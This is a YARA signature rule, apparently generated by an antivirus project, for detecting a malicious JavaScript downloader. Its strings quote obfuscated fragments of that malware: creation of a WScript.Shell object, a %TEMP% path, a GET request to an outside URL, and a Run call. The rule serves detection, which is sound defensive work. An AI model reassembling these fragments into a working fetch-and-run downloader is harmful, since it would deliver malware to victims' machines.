rule sig_20160427_49403eb4ea816eb6f6f61b5f28cc25e0 {
  meta:
    description = "datamaliciousorder - file 20160427_49403eb4ea816eb6f6f61b5f28cc25e0.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ce1a3ef6cf3f740596d75cebaf7293b1b19d673844758349120354d475a4541a"

  strings:
    $s1  = "function DklhtAjltf() {return FfwxhQhgmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"YlvGZH3" ascii
    $s2  = "function DklhtAjltf() {return FfwxhQhgmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"YlvGZH3" ascii
    $s3  = "var FfwxhQhgmd = function TjfqxLbdwy() {return YdorzLvgvn[WayzcFdbwn](\"WScript\"+\".Shell\");}(), MaislBowfq = 11;" fullword ascii
    $s4  = "function TwihnLyecy(VykksYpwej, IiqlgKfsra){TrntwXipzk = TrntwXipzk * 1; return VykksYpwej - IiqlgKfsra;};" fullword ascii
    $s5  = "SgkabEaasn[HsjnhQjagk](\"G\" + \"ET\", \"http://rayzan24.co/m3usjd\", false);" fullword ascii
    $s6  = "var YdorzLvgvn = this[\"WScript\"];" fullword ascii
    $s7  = "function AlxmhIknhd(){return ZqpxuUxeqt + \"\";};" fullword ascii
    $s8  = "if (SgkabEaasn[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "var UzsygKovyt = false;" fullword ascii
    $s10 = "var EtoduOewwm = false;" fullword ascii
    $s11 = "UzsygKovyt = true;" fullword ascii
    $s12 = "function HuajtBtcnp(XmbfvRwrsm) {var TsfwwOgpxb = (1, 2, 3, 4, 5, XmbfvRwrsm); return TsfwwOgpxb;};" fullword ascii
    $s13 = "EtoduOewwm = true; " fullword ascii
    $s14 = "var IkhjcVmjeg = false;" fullword ascii
    $s15 = "}while (GiiljUkekf);" fullword ascii
    $s16 = "function DmlpaHushi(){return WayzcFdbwn;};" fullword ascii
    $s17 = "function KiycyQlnzr(RjdmjFxukk){FfwxhQhgmd[\"R\"+\"un\"](RjdmjFxukk, TrntwXipzk, TrntwXipzk);};" fullword ascii
    $s18 = "function GqdqdInuaf()" fullword ascii
    $s19 = "IkhjcVmjeg = true; " fullword ascii
    $s20 = "function BxifgQhyrx(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}